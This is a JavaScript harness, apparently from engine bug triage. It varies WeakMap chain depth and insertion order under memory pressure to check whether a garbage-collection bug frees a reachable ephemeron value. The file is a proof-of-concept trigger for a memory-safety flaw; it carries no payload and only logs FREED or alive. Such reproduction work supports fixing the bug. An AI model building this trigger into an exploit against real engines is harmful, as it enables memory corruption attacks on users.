// 37975 ordering/level variants.
//
// The RCA says the trigger depends on WeakMap entry ordering, which is randomised.
// Two variables are swept here: chain depth (`level`, upstream 4) and the order in
// which the final entries are inserted. Pressure is the pattern proven to collect.
var print = (typeof print === 'function') ? print : function () { };
function say(s) { print('[v37975] ' + s); }

var initKey = { init: 1 };
var PER = 500000;
var STEPS = 28;

function hideWeakMap(map, level, initKey) {
  let prevMap = map, prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = new WeakMap();
    prevMap.set(prevKey, thisMap);
    let thisKey = { 'h': i };
    thisMap.set(prevKey, thisKey);
    prevMap = thisMap; prevKey = thisKey;
    if (i == level - 1) { let retMap = new WeakMap(); map.set(thisKey, retMap); return thisKey; }
  }
}
function getHiddenKey(map, level, initKey) {
  let prevMap = map, prevKey = initKey;
  for (let i = 0; i < level; i++) {
    let thisMap = prevMap.get(prevKey);
    let thisKey = thisMap.get(prevKey);
    prevMap = thisMap; prevKey = thisKey;
    if (i == level - 1) { return thisKey; }
  }
}
// `reversed` inserts the same entries in the opposite sequence, which changes the
// order the collector discovers the ephemerons.
function setUpWeakMap(map, level, reversed) {
  let hk = hideWeakMap(map, level, initKey);
  let hiddenMap = map.get(hk);
  let map7 = new WeakMap(), map8 = new WeakMap(), map5 = new WeakMap();
  let k5 = { k5: 1 }, k7 = { k7: 1 }, k9 = { k9: 1 }, k8 = { k8: 1 }, v9 = {};
  if (reversed) {
    map8.set(k8, k9); map7.set(k7, k8); map7.set(k8, map8);
    map5.set(hk, k7); hiddenMap.set(hk, k5); hiddenMap.set(k5, map5);
    map.set(k9, v9); map.set(k7, map7);
  } else {
    map.set(k7, map7); map.set(k9, v9);
    hiddenMap.set(k5, map5); hiddenMap.set(hk, k5); map5.set(hk, k7);
    map7.set(k8, map8); map7.set(k7, k8); map8.set(k8, k9);
  }
}

var plan = [
  [3, false], [4, true], [5, false], [5, true],
  [6, false], [6, true], [7, false], [3, true]
];
var i = 0, hits = 0;

function press(then) {
  var keep = [], n = 0;
  function step() {
    n++;
    try { var a = new Array(PER); a.fill(1.1); keep.push(a); } catch (e) { }
    if (n < STEPS) { setTimeout(step, 25); return; }
    setTimeout(then, 80);
  }
  step();
}

function round() {
  var level = plan[i][0], reversed = plan[i][1];
  i++;
  var map1 = new WeakMap();
  setUpWeakMap(map1, level, reversed);
  press(function () {
    var observed;
    try {
      let hk = getHiddenKey(map1, level, initKey);
      let hiddenMap = map1.get(hk);
      let k7 = hiddenMap.get(hiddenMap.get(hk)).get(hk);
      let k8 = map1.get(k7).get(k7);
      let map8 = map1.get(k7).get(k8);
      observed = map1.get(map8.get(k8));
    } catch (e) { say('round ' + i + ' threw ' + e.name); }
    if (observed === undefined) { hits++; }
    say('round ' + i + ' level=' + level + ' reversed=' + reversed + ' ' +
        (observed === undefined ? 'FREED' : 'alive') + ' hits=' + hits);
    if (i < plan.length) { setTimeout(round, 150); return; }
    say('RESULT trials=' + i + ' freed=' + hits +
        ' verdict=' + (hits > 0 ? 'FIRES' : 'no-fire'));
    say('done');
  });
}
say('begin plan=' + JSON.stringify(plan));
round();
